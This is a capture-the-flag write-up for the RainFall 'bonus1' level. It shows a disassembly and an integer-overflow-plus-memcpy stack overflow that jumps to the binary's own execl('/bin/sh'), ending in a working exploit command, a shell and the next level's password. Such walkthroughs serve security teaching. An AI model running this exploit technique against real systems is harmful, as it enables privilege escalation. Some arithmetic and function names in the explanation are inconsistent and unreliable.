# Bonus1

## Exploring the binary
```shell
bonus1@RainFall:~$ ./bonus1
Segmentation fault (core dumped)
bonus1@RainFall:~$ ./bonus1 phantom
bonus1@RainFall:~$
```
The binary accepts argument values and crashes when called with no arguments. Let's explore the functions:

## GDB analysis
```shell
Dump of assembler code for function main:
   0x08048424 <+0>:	push   %ebp
   0x08048425 <+1>:	mov    %esp,%ebp
   0x08048427 <+3>:	and    $0xfffffff0,%esp
   0x0804842a <+6>:	sub    $0x40,%esp
   0x0804842d <+9>:	mov    0xc(%ebp),%eax
   0x08048430 <+12>:	add    $0x4,%eax
   0x08048433 <+15>:	mov    (%eax),%eax
   0x08048435 <+17>:	mov    %eax,(%esp)
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    %eax,0x3c(%esp)
   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    $0x1,%eax
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    0x3c(%esp),%eax
   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
   0x0804845a <+54>:	mov    0xc(%ebp),%eax
   0x0804845d <+57>:	add    $0x8,%eax
   0x08048460 <+60>:	mov    (%eax),%eax
   0x08048462 <+62>:	mov    %eax,%edx
   0x08048464 <+64>:	lea    0x14(%esp),%eax
   0x08048468 <+68>:	mov    %ecx,0x8(%esp)
   0x0804846c <+72>:	mov    %edx,0x4(%esp)
   0x08048470 <+76>:	mov    %eax,(%esp)
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:	movl   $0x8048583,(%esp)
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    $0x0,%eax
   0x080484a3 <+127>:	leave
   0x080484a4 <+128>:	ret
End of assembler dump.
```
We observe that <code>atoi()</code> is invoked on <code>av[1]</code> to convert it into an integer. The resultant value is then stored in memory, offset from the stack pointer, and compared against 9 using <code>jle</code>. Should the number exceed 9, <code>eax</code> is assigned the value 1, triggering a jump to the exit sequence. Otherwise, the <code>atoi()</code> result is multiplied by 4 and later in the function compared to <code>0x574f4c46</code> (1464814662). Another call we observe is to the <code>strcpy()</code> function, where a string from <code>av[2]</code> is combined with the multiplied number.

## buffer overflow
Another call we observe is to the <code>memcpy()</code> function, where a string from <code>av[2]</code> is combined with the multiplied number. Since the copying function doesn't inherently perform boundary checks, we decide that a <code>buffer overflow</code> attack is our way forward. We can determine the offset value as before, but we need to figure out how to significantly increase the value of the multiplied number, since the biggest value we can achieve is 36.

The maximum value for an unsigned 32-bit integer is 4294967295. Dividing this number by 4 gives us 1073741824. This may still be too large, so we decide to decrease the final number by 280. By subtracting 70 from the digit and passing -1073741754 as the first argument, we are able to test for the offset.

``` shell
(gdb) run -1073741824 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
Starting program: /home/user/bonus1/bonus1 -1073741824 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
[Inferior 1 (process 5146) exited normally]
(gdb) run -1073741799 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
Starting program: /home/user/bonus1/bonus1 -1073741799 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'

Program received signal SIGSEGV, Segmentation fault.
0x39624138 in ?? ()
```
The final step is to invoke <code>/bin/bash</code>. We have already observed that the <code>execl()</code> function is called within the <code>main()</code> function, which piqued our interest. Just before this call, two immediate values are pushed onto the stack (<code>%esp</code>), which will ultimately initiate the shell for us:
``` shell
(gdb) x/s 0x8048580
0x8048580:	 "sh"
(gdb) x/s 0x8048583
0x8048583:	 "/bin/sh"
```
Due to this, our exploit jumps to the address <code>0x08048482</code> to continue executing the desired sequence.

## Exploit
``` shell
bonus1@RainFall:~$ ./bonus1 -1073741799 $(python -c 'print "\x90" * 56 + "\x08\x04\x84\x82"[::-1]')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
